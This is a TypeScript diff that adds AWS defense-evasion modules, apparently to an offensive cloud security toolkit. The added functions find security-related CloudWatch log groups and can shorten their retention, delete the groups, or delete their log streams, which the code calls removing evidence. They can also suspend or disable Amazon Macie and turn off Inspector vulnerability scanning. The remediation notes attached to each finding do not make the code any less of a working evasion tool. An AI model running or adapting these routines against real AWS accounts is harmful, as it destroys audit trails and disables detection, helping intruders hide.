@@ -666,3 +666,255 @@ export async function dnsFirewallDisable(args: string[], timeout: number): Promi
 
   return { output: output.join("\n"), findings }
 }
+
+export async function cloudwatchTamper(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const action = argVal(args, "--action") || "status"
+  const groupName = argVal(args, "--log-group")
+  const retentionDays = argVal(args, "--retention") || "1"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] CloudWatch Logs Tampering\n"]
+
+  const groups = await aws(["logs", "describe-log-groups", "--query", "logGroups[].[logGroupName,storedBytes,retentionInDays,kmsKeyId]"], profile, region, timeout)
+  if (groups.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: logs:DescribeLogGroups", findings }
+
+  const gl = tryJson(groups.stdout) || []
+  output.push(`[+] Log groups: ${gl.length}`)
+
+  const securityGroups = gl.filter((g: (string | number | null)[]) => {
+    const name = String(g[0]).toLowerCase()
+    return name.includes("cloudtrail") || name.includes("guardduty") || name.includes("config") || name.includes("vpc-flow") || name.includes("waf") || name.includes("security")
+  })
+
+  if (securityGroups.length) {
+    output.push(`\n[!] Security-relevant log groups:`)
+    for (const g of securityGroups) {
+      const sizeMB = Math.round((Number(g[1]) || 0) / 1024 / 1024)
+      output.push(`  ${g[0]}  Size: ${sizeMB}MB  Retention: ${g[2] || "never expires"}`)
+    }
+  }
+
+  if (action === "status") {
+    output.push("\n[*] Actions: --action delete (delete group), --action reduce_retention (set 1-day retention), --action delete_streams (delete log streams)")
+    return { output: output.join("\n"), findings }
+  }
+
+  if (action === "reduce_retention") {
+    const targets = groupName ? gl.filter((g: string[]) => g[0] === groupName) : securityGroups
+    for (const g of targets) {
+      const r = await aws(["logs", "put-retention-policy", "--log-group-name", g[0], "--retention-in-days", retentionDays], profile, region, timeout)
+      if (r.exitCode === 0) {
+        output.push(`[+] Retention set to ${retentionDays} day(s): ${g[0]}`)
+        findings.push({
+          checkId: "AWS-EVASION-011",
+          provider: "aws",
+          severity: "critical",
+          status: "MODIFIED",
+          resource: `cloudwatch:loggroup:${g[0]}`,
+          title: `Log retention reduced to ${retentionDays}d: ${g[0]}`,
+          details: `Previous retention: ${g[2] || "never expires"} → ${retentionDays} day(s). Old logs will auto-delete`,
+          remediation: `Restore retention: aws logs put-retention-policy --log-group-name '${g[0]}' --retention-in-days ${g[2] || 365}`,
+        })
+      }
+    }
+  }
+
+  if (action === "delete") {
+    const target = groupName || securityGroups[0]?.[0]
+    if (!target) return { output: output.join("\n") + "\n[-] --log-group required or no security groups found", findings }
+
+    const r = await aws(["logs", "delete-log-group", "--log-group-name", typeof target === "string" ? target : target[0]], profile, region, timeout)
+    const name = typeof target === "string" ? target : target[0]
+    if (r.exitCode === 0) {
+      output.push(`[+] Log group deleted: ${name}`)
+      findings.push({
+        checkId: "AWS-EVASION-012",
+        provider: "aws",
+        severity: "critical",
+        status: "DELETED",
+        resource: `cloudwatch:loggroup:${name}`,
+        title: `CloudWatch log group deleted: ${name}`,
+        details: "All log data permanently destroyed",
+        remediation: "Log group and data cannot be recovered — recreate and reconfigure log delivery",
+      })
+    } else {
+      output.push(`[-] Delete failed: ${r.stderr.trim()}`)
+    }
+  }
+
+  if (action === "delete_streams") {
+    const target = groupName || securityGroups[0]?.[0]
+    if (!target) return { output: output.join("\n") + "\n[-] --log-group required", findings }
+    const name = typeof target === "string" ? target : target[0]
+
+    const streams = await aws(["logs", "describe-log-streams", "--log-group-name", name, "--order-by", "LastEventTime", "--descending", "--limit", "50", "--query", "logStreams[].logStreamName"], profile, region, timeout)
+    if (streams.exitCode === 0) {
+      const stl = tryJson(streams.stdout) || []
+      let deleted = 0
+      for (const st of stl) {
+        const d = await aws(["logs", "delete-log-stream", "--log-group-name", name, "--log-stream-name", st], profile, region, timeout)
+        if (d.exitCode === 0) deleted++
+      }
+      output.push(`[+] Deleted ${deleted}/${stl.length} log streams from ${name}`)
+      if (deleted > 0) {
+        findings.push({
+          checkId: "AWS-EVASION-013",
+          provider: "aws",
+          severity: "critical",
+          status: "DELETED",
+          resource: `cloudwatch:streams:${name}`,
+          title: `${deleted} log streams deleted from ${name}`,
+          details: "Log streams and their data permanently destroyed — group still exists but evidence removed",
+          remediation: "Log data cannot be recovered — investigate timeline and restore from backups",
+        })
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function macieDisable(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const action = argVal(args, "--action") || "status"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Amazon Macie — Sensitive Data Discovery\n"]
+
+  const session = await aws(["macie2", "get-macie-session"], profile, region, timeout)
+  if (session.exitCode !== 0) {
+    output.push("[-] Macie not enabled or access denied")
+    return { output: output.join("\n"), findings }
+  }
+
+  const s = tryJson(session.stdout)
+  output.push(`[+] Macie status: ${s?.status}`)
+  output.push(`    Created: ${s?.createdAt}`)
+  output.push(`    Service role: ${s?.serviceRole}`)
+  output.push(`    Finding publishing frequency: ${s?.findingPublishingFrequency}`)
+
+  const buckets = await aws(["macie2", "describe-buckets", "--query", "buckets | length(@)"], profile, region, timeout)
+  if (buckets.exitCode === 0) {
+    output.push(`    Monitored buckets: ${tryJson(buckets.stdout) || 0}`)
+  }
+
+  const jobs = await aws(["macie2", "list-classification-jobs", "--query", "items[].[jobId,name,jobStatus,jobType]"], profile, region, timeout)
+  if (jobs.exitCode === 0) {
+    const jl = tryJson(jobs.stdout) || []
+    output.push(`    Classification jobs: ${jl.length}`)
+    for (const j of jl) output.push(`      ${j[1]} (${j[0]})  Status: ${j[2]}  Type: ${j[3]}`)
+  }
+
+  if (action === "status") {
+    output.push("\n[*] Actions: --action suspend (pause), --action disable (permanently disable)")
+    return { output: output.join("\n"), findings }
+  }
+
+  if (action === "suspend") {
+    const r = await aws(["macie2", "update-macie-session", "--status", "PAUSED"], profile, region, timeout)
+    if (r.exitCode === 0) {
+      output.push(`\n[+] Macie suspended — sensitive data discovery paused`)
+      findings.push({
+        checkId: "AWS-EVASION-014",
+        provider: "aws",
+        severity: "critical",
+        status: "SUSPENDED",
+        resource: "macie:session",
+        title: "Amazon Macie suspended",
+        details: "S3 sensitive data discovery paused — new sensitive data in S3 will not be detected",
+        remediation: "Resume: aws macie2 update-macie-session --status ENABLED",
+      })
+    }
+  }
+
+  if (action === "disable") {
+    const r = await aws(["macie2", "disable-macie"], profile, region, timeout)
+    if (r.exitCode === 0) {
+      output.push(`\n[+] Macie disabled permanently`)
+      findings.push({
+        checkId: "AWS-EVASION-014",
+        provider: "aws",
+        severity: "critical",
+        status: "DISABLED",
+        resource: "macie:session",
+        title: "Amazon Macie disabled",
+        details: "Macie permanently disabled — all classification jobs stopped, findings deleted after 30 days",
+        remediation: "Re-enable: aws macie2 enable-macie",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function inspectorDisable(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const action = argVal(args, "--action") || "status"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Amazon Inspector — Vulnerability Scanning\n"]
+
+  const status = await aws(["inspector2", "batch-get-account-status", "--query", "accounts[0].{state:state,ec2:resourceState.ec2,ecr:resourceState.ecr,lambda:resourceState.lambda}"], profile, region, timeout)
+  if (status.exitCode !== 0) {
+    output.push("[-] Inspector v2 not enabled or access denied")
+    return { output: output.join("\n"), findings }
+  }
+
+  const s = tryJson(status.stdout)
+  output.push(`[+] Inspector status: ${s?.state?.status || "unknown"}`)
+  if (s?.ec2) output.push(`    EC2 scanning: ${s.ec2.status}`)
+  if (s?.ecr) output.push(`    ECR scanning: ${s.ecr.status}`)
+  if (s?.lambda) output.push(`    Lambda scanning: ${s.lambda.status}`)
+
+  const coverage = await aws(["inspector2", "list-coverage", "--query", "coveredResources | length(@)"], profile, region, timeout)
+  if (coverage.exitCode === 0) {
+    output.push(`    Covered resources: ${tryJson(coverage.stdout) || 0}`)
+  }
+
+  const findingsCount = await aws(["inspector2", "list-finding-aggregations", "--aggregation-type", "ACCOUNT", "--query", "responses[0].{critical:severityCounts.critical,high:severityCounts.high,medium:severityCounts.medium}"], profile, region, timeout)
+  if (findingsCount.exitCode === 0) {
+    const fc = tryJson(findingsCount.stdout)
+    if (fc) output.push(`    Findings: Critical=${fc.critical || 0} High=${fc.high || 0} Medium=${fc.medium || 0}`)
+  }
+
+  if (action === "status") {
+    output.push("\n[*] Actions: --action disable (disable all scanning)")
+    return { output: output.join("\n"), findings }
+  }
+
+  if (action === "disable") {
+    const types = ["EC2", "ECR", "LAMBDA", "LAMBDA_CODE"]
+    const r = await aws(["inspector2", "disable", "--resource-types", ...types], profile, region, timeout)
+    if (r.exitCode === 0) {
+      output.push(`\n[+] Inspector disabled for: ${types.join(", ")}`)
+      findings.push({
+        checkId: "AWS-EVASION-015",
+        provider: "aws",
+        severity: "critical",
+        status: "DISABLED",
+        resource: "inspector:scanning",
+        title: "Amazon Inspector vulnerability scanning disabled",
+        details: `Disabled scanning for ${types.join(", ")} — new vulnerabilities will not be detected`,
+        remediation: `Re-enable: aws inspector2 enable --resource-types ${types.join(" ")}`,
+      })
+    } else {
+      const partial = await aws(["inspector2", "disable", "--resource-types", "EC2", "ECR"], profile, region, timeout)
+      if (partial.exitCode === 0) {
+        output.push(`[+] Inspector partially disabled (EC2, ECR)`)
+        findings.push({
+          checkId: "AWS-EVASION-015",
+          provider: "aws",
+          severity: "critical",
+          status: "DISABLED",
+          resource: "inspector:scanning",
+          title: "Amazon Inspector scanning disabled (EC2, ECR)",
+          details: "EC2 and ECR vulnerability scanning disabled",
+          remediation: "Re-enable: aws inspector2 enable --resource-types EC2 ECR",
+        })
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
